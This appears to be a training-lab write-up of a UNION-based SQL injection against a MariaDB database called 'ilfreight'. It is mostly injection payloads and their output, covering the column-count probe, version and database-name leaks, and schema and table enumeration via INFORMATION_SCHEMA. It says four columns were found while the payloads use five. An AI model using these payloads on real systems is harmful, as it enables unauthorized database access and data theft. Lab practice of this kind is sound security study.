# Assessment

Here is the first successful injection results:

>cn' UNION select 1,2,3-- -

With the resulting output:

>Adam 	January 	1337$ 	5%
>James 	March 	1213$ 	8%

I then iterated through another UNION query to find out how many columns were in the table I am accessing:

>cn' UNION SELECT 1,2,3,4,5-- -

Once I determined there were four columns with the above injection, I used \@@version to determine the current version of the database being used:

>cn' UNION SELECT 1,\@@version,3,4,5-- -

This returned:

>10.3.22-MariaDB-1ubuntu1

Then I wanted to determine the current database name using the following query:

>cn' UNION SELECT 1,database(),3,4,5-- -

Which returned:

>ilfreight

Now that I knew the name of the database being used, I decided to determine what other databases were available with the following injection:

>cn' UNION select 1,schema_name,3,4,5 from INFORMATION_SCHEMA.SCHEMATA-- -

This returned the following:

>information_schema 	3 	4 	5
>mysql 	3 	4 	5
>performance_schema 	3 	4 	5
>ilfreight 	3 	4 	5
>backup 	3 	4 	5

From here I ruled out the default databases named information_schema, mysql, and performance_schema, and focused on the remaining databases named ilfreight and backup.

Now I decided to discover all the tables within the two databases of interest with the two following statements:

>cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4,5 from INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- -

>cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4,5 from INFORMATION_SCHEMA.TABLES where table_schema='backup'-- -